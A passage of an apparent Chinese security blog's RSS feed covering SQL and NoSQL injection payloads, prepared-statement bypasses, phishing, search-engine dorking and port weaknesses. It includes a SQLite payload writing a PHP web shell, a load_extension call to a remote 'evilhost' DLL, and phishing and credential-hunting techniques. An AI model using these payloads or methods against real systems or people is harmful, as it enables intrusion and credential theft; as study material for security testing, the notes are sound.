&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ATTACH &lt;span class=&#34;token keyword&#34;&gt;DATABASE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/var/www/lol.php&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pwn &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dataz &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pwn &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dataz&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?system($_GET[&#39;&lt;/span&gt;cmd&lt;span class=&#34;token string&#34;&gt;&#39;]); ?&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Load_extension&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;load_extension&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\\evilhost\evil.dll&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;E&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;nosql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql-payload&#34;&gt;#&lt;/a&gt; NoSQL Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-4&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;绕过限制条件
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;: &amp;quot;user&amp;quot;&amp;#125;&lt;/code&gt;  =&amp;gt;  &lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;: &amp;#123;&amp;quot;ne&amp;quot;: &amp;quot;fakeuser&amp;quot;&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;return true&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;测试用字符
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;&amp;quot;\/$[].&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;布尔测试常用
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$ne&amp;quot;: -1&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$in&amp;quot;: []&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;return true&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$or&amp;quot;: [&amp;#123;&amp;#125;,&amp;#123;&amp;quot;foo&amp;quot;:&amp;quot;1&amp;quot;&amp;#125;]&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;时间
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;sleep(100)&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译&#34;&gt;#&lt;/a&gt; 预编译&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL 引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。&lt;/p&gt;
&lt;h2 id=&#34;模拟预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模拟预编译&#34;&gt;#&lt;/a&gt; 模拟预编译&lt;/h2&gt;
&lt;p&gt;为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。&lt;/p&gt;
&lt;h2 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h2&gt;
&lt;h3 id=&#34;预编译使用错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译使用错误&#34;&gt;#&lt;/a&gt; 预编译使用错误&lt;/h3&gt;
&lt;p&gt;预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。&lt;/p&gt;
&lt;h3 id=&#34;部分参数不可预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#部分参数不可预编译&#34;&gt;#&lt;/a&gt; 部分参数不可预编译&lt;/h3&gt;
&lt;p&gt;在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。&lt;/p&gt;
&lt;h3 id=&#34;预编译实现错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译实现错误&#34;&gt;#&lt;/a&gt; 预编译实现错误&lt;/h3&gt;
&lt;p&gt;部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。&lt;/p&gt;
&lt;h1 id=&#34;参考文章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文章&#34;&gt;#&lt;/a&gt; 参考文章&lt;/h1&gt;
&lt;h2 id=&#34;tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tricks&#34;&gt;#&lt;/a&gt; Tricks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cud2lsczBuLmNuL2FyY2hpdmVzLzE3OC8=&#34;&gt;sqlmap time based inject 分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9TUUxJbmplY3Rpb25XaWtp&#34;&gt;SQLInjectionWiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnVjQ055Q215QVRkUkVOWnAwQUYyQQ==&#34;&gt;常见数据库写入 Webshell 汇总&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdUVOdnBQYW43YVZkN01iU29BVDlEZw==&#34;&gt;MSSQL 数据库攻击实战指北&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; Bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZlNCWlBrTzAtSE5ZZkxnbVlXSktDZw==&#34;&gt;SQL 注入 ByPass 的一些小技巧&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY4&#34;&gt;Waf Bypass 之道&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FsZWVuenovTVlTUUxfU1FMX0JZUEFTU19XSUtJ&#34;&gt;MySQL Bypass Wiki&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nosql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql&#34;&gt;#&lt;/a&gt; NoSQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy55dW53ZWlwYWkuY29tL2FyY2hpdmVzLzE0MDg0Lmh0bWw=&#34;&gt;NoSQL 注入的分析和缓解&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdEc4NzRMTlRJZGlON01QdE8taG92QQ==&#34;&gt;NoSQL 注入&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cheatsheet-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cheatsheet-2&#34;&gt;#&lt;/a&gt; Cheatsheet&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0lnbml0ZXRlY2hub2xvZ2llcy9NU1NRTC1QZW50ZXN0LUNoZWF0c2hlZXQ=&#34;&gt;MSSQL Pentest Cheatsheet&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/information%20gathering/Social%20Engineering/</guid>
            <title>社会工程学</title>
            <link>https://mobius-0.github.io/security/WebNote/information%20gathering/Social%20Engineering/</link>
            <category>信息收集</category>
            <category>社会工程学</category>
            <pubDate>Sat, 26 Nov 2022 10:57:49 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;企业信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#企业信息收集&#34;&gt;#&lt;/a&gt; 企业信息收集&lt;/h1&gt;
&lt;p&gt;一些网站如天眼查等，可以提供企业关系挖掘、工商信息、商标专利、企业年报等信息查询，可以提供企业的较为细致的信息。&lt;/p&gt;
&lt;p&gt;公司主站中会有业务方向、合作单位等信息。&lt;/p&gt;
&lt;h1 id=&#34;人员信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#人员信息收集&#34;&gt;#&lt;/a&gt; 人员信息收集&lt;/h1&gt;
&lt;p&gt;针对人员的信息收集考虑对目标重要人员、组织架构、社会关系的收集和分析。其中重要人员主要指高管、系统管理员、开发、运维、财务、人事、业务人员的个人电脑。&lt;/p&gt;
&lt;p&gt;人员信息收集较容易的入口点是网站，网站中可能包含网站的开发、管理维护等人员的信息。从网站联系功能中和代码的注释信息中都可能得到的所有开发及维护人员的姓名和邮件地址及其他联系方式。&lt;/p&gt;
&lt;p&gt;在获取这些信息后，可以在 Github/Linkedin 等社交、招聘网站中进一步查找这些人在互联网上发布的与目标站点有关的一切信息，分析并发现有用的信息。&lt;/p&gt;
&lt;p&gt;此外，可以对获取到的邮箱进行密码爆破的操作，获取对应的密码。&lt;/p&gt;
&lt;h1 id=&#34;钓鱼&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#钓鱼&#34;&gt;#&lt;/a&gt; 钓鱼&lt;/h1&gt;
&lt;p&gt;基于之前收集到的信息，可以使用 Office/CHM/RAR/EXE/ 快捷方式等文件格式制作钓鱼邮件发送至目标，进一步收集信息。&lt;/p&gt;
&lt;p&gt;其中 Office 可以使用 Office 漏洞、宏、OLE 对象、PPSX 等方式构造利用文件。&lt;/p&gt;
&lt;p&gt;Exe 可以使用特殊的 Unicode 控制字符如 RLO (Right-to-Left Override) 等来构建容易混淆的文件名。&lt;/p&gt;
&lt;p&gt;RAR 主要是利用自解压等方式来构建恶意文件，同样加密的压缩包也在一定程度上可以逃逸邮件网关的检测。&lt;/p&gt;
&lt;p&gt;如果前期信息收集获取到了运维等人员的邮箱，可以使用运维人员的邮箱发送，如果未收集到相关的信息，可以使用伪造发送源的方式发送邮件。&lt;/p&gt;
&lt;p&gt;需要注意的是，钓鱼测试也需要注意合规问题，不能冒充监管单位、不能发送违法违规信息。具体可以参考《中华人民共和国电信条例》、《中华人民共和国互联网电子邮件服务管理办法》等法律法规。&lt;/p&gt;
&lt;h1 id=&#34;其他信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他信息&#34;&gt;#&lt;/a&gt; 其他信息&lt;/h1&gt;
&lt;p&gt;公司的公众号、企业号、网站，员工的网盘、百度文库等可能会存在一些敏感信息，如 VPN / 堡垒机账号、TeamViewer 账号、网络设备默认口令、服务器默认口令等。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy8xNTQ0MS5odG1s&#34;&gt;端口渗透总结&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQwOQ==&#34;&gt;未授权访问总结&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYWF0TmpleTNzd1p6N1Q0WXdfTHFzUQ==&#34;&gt;红队测试之邮箱打点&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZHFudGpSTGdjT0QzRDJiaTFvREZBdw==&#34;&gt;邮件伪造之 SPF 绕过的 5 种思路&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/information%20gathering/search%20engine/</guid>
            <title>搜索引擎利用</title>
            <link>https://mobius-0.github.io/security/WebNote/information%20gathering/search%20engine/</link>
            <category>信息收集</category>
            <category>搜索</category>
            <pubDate>Sat, 26 Nov 2022 10:10:49 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;恰当地使用搜索引擎（Google/Bing/Yahoo/Baidu 等）可以获取目标站点的较多信息。&lt;/p&gt;
&lt;h1 id=&#34;搜索引擎处理流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索引擎处理流程&#34;&gt;#&lt;/a&gt; 搜索引擎处理流程&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据预处理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;长度截断&lt;/li&gt;
&lt;li&gt;大小写转化&lt;/li&gt;
&lt;li&gt;去标点符号&lt;/li&gt;
&lt;li&gt;简繁转换&lt;/li&gt;
&lt;li&gt;数字归一化，中文数字、阿拉伯数字、罗马字&lt;/li&gt;
&lt;li&gt;同义词改写&lt;/li&gt;
&lt;li&gt;拼音改写&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;处理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分词&lt;/li&gt;
&lt;li&gt;关键词抽取&lt;/li&gt;
&lt;li&gt;非法信息过滤&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;搜索技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索技巧&#34;&gt;#&lt;/a&gt; 搜索技巧&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;site:www.hao123.com&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;返回此目标站点被搜索引擎抓取收录的所有内容&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;site:www.hao123.com keyword&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;返回此目标站点被搜索引擎抓取收录的包含此关键词的所有页面&lt;/li&gt;
&lt;li&gt;此处可以将关键词设定为网站后台，管理后台，密码修改，密码找回等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;site:www.hao123.com inurl:admin.php&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;返回目标站点的地址中包含 admin.php 的所有页面，可以使用 admin.php/manage.php 或者其他关键词来寻找关键功能页面&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;link:www.hao123.com&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;返回所有包含目标站点链接的页面，其中包括其开发人员的个人博客，开发日志，或者开放这个站点的第三方公司，合作伙伴等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;related:www.hao123.com&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;返回所有与目标站点” 相似” 的页面，可能会包含一些通用程序的信息等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;intitle:&amp;quot;500 Internal Server Error&amp;quot; &amp;quot;server at&amp;quot;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;搜索出错的页面&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;inurl:&amp;quot;nph-proxy.cgi&amp;quot; &amp;quot;Start browsing&amp;quot;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查找代理服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了以上的关键字，还有 allintile /allinurl/allintext /inanchor/intext /filetype/info /numberange/cache 等。&lt;/p&gt;
&lt;h2 id=&#34;通配符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通配符&#34;&gt;#&lt;/a&gt; 通配符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;  代表某一个单词&lt;/li&gt;
&lt;li&gt;OR 或者 | 代表逻辑或&lt;/li&gt;
&lt;li&gt;单词前跟  &lt;code&gt;+&lt;/code&gt;  表强制查询&lt;/li&gt;
&lt;li&gt;单词前跟  &lt;code&gt;-&lt;/code&gt;  表排除对应关键字&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;&lt;/code&gt;  强调关键字&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tips&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tips&#34;&gt;#&lt;/a&gt; tips&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;查询不区分大小写&lt;/li&gt;
&lt;li&gt;括号会被忽略&lt;/li&gt;
&lt;li&gt;默认用 and 逻辑进行搜索&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;快照&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#快照&#34;&gt;#&lt;/a&gt; 快照&lt;/h1&gt;
&lt;p&gt;搜索引擎的快照中也常包含一些关键信息，如程序报错信息可以会泄漏网站具体路径，或者一些快照中会保存一些测试用的测试信息，比如说某个网站在开发了后台功能模块的时候，还没给所有页面增加权限鉴别，此时被搜索引擎抓取了快照，即使后来网站增加了权限鉴别，但搜索引擎的快照中仍会保留这些信息。&lt;/p&gt;
&lt;p&gt;另外也有专门的站点快照提供快照功能，如 Wayback Machine 和 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcmNoaXZlLm9yZy8=&#34;&gt;Archive.org&lt;/span&gt; 等。&lt;/p&gt;
&lt;h1 id=&#34;github&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#github&#34;&gt;#&lt;/a&gt; Github&lt;/h1&gt;
&lt;p&gt;在 Github 中，可能会存在源码泄露、AccessKey 泄露、密码、服务器配置泄露等情况，常见的搜索技巧有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@example.com password/pass/pwd/secret/credentials/token&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@example.com username/user/key/login/ftp/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@example.com config/ftp/smtp/pop&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@example.com security_credentials/connetionstring&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@example.com JDBC/ssh2_auth_password/send_keys&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/information%20gathering/website%20information/</guid>
            <title>站点信息</title>
            <link>https://mobius-0.github.io/security/WebNote/information%20gathering/website%20information/</link>
            <category>网站</category>
            <category>信息收集</category>
            <category>搜索</category>
            <pubDate>Sat, 26 Nov 2022 10:03:09 +0800</pubDate>
            <description><![CDATA[ &lt;ul&gt;
&lt;li&gt;
&lt;p&gt;判断网站操作系统&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux 大小写敏感&lt;/li&gt;
&lt;li&gt;Windows 大小写不敏感&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扫描敏感文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;robots.txt&lt;/li&gt;
&lt;li&gt;crossdomain.xml&lt;/li&gt;
&lt;li&gt;sitemap.xml&lt;/li&gt;
&lt;li&gt;xx.tar.gz&lt;/li&gt;
&lt;li&gt;xx.bak 等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;确定网站采用的语言&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如 PHP / Java / Python 等&lt;/li&gt;
&lt;li&gt;找后缀，比如 php/asp/jsp&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;前端框架&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如 jQuery / BootStrap / Vue / React / Angular 等&lt;/li&gt;
&lt;li&gt;查看源代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;中间服务器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如 Apache / Nginx / IIS 等&lt;/li&gt;
&lt;li&gt;查看 header 中的信息&lt;/li&gt;
&lt;li&gt;根据报错信息判断&lt;/li&gt;
&lt;li&gt;根据默认页面判断&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Web 容器服务器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如 Tomcat / Jboss / Weblogic 等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;后端框架&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据 Cookie 判断&lt;/li&gt;
&lt;li&gt;根据 CSS / 图片等资源的 hash 值判断&lt;/li&gt;
&lt;li&gt;根据 URL 路由判断
&lt;ul&gt;
&lt;li&gt;如 wp-admin&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;根据网页中的关键字判断&lt;/li&gt;
&lt;li&gt;根据响应头中的 X-Powered-By&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CDN 信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常见的有 Cloudflare、yunjiasu&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;探测有没有 WAF，如果有，什么类型的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有 WAF，找绕过方式&lt;/li&gt;
&lt;li&gt;没有，进入下一步&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扫描敏感目录，看是否存在信息泄漏&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;扫描之前先自己尝试几个的 url，人为看看反应&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用爬虫爬取网站信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;常见入口目标&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关注度低的系统&lt;/li&gt;
&lt;li&gt;业务线较长的系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/information%20gathering/Ports/</guid>
            <title>端口信息</title>
            <link>https://mobius-0.github.io/security/WebNote/information%20gathering/Ports/</link>
            <category>漏洞</category>
            <category>信息收集</category>
            <category>端口</category>
            <pubDate>Fri, 25 Nov 2022 17:02:36 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;常见端口及其脆弱点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见端口及其脆弱点&#34;&gt;#&lt;/a&gt; 常见端口及其脆弱点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;FTP (21/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;默认用户名密码  &lt;code&gt;anonymous:anonymous&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;暴力破解密码&lt;/li&gt;
&lt;li&gt;VSFTP 某版本后门&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SSH (22/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;部分版本 SSH 存在漏洞可枚举用户名&lt;/li&gt;
&lt;li&gt;暴力破解密码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Telent (23/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;暴力破解密码&lt;/li&gt;
&lt;li&gt;嗅探抓取明文密码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SMTP (25/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无认证时可伪造发件人&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS (53/UDP &amp;amp; 53/TCP)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;域传送漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DNS 劫持&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
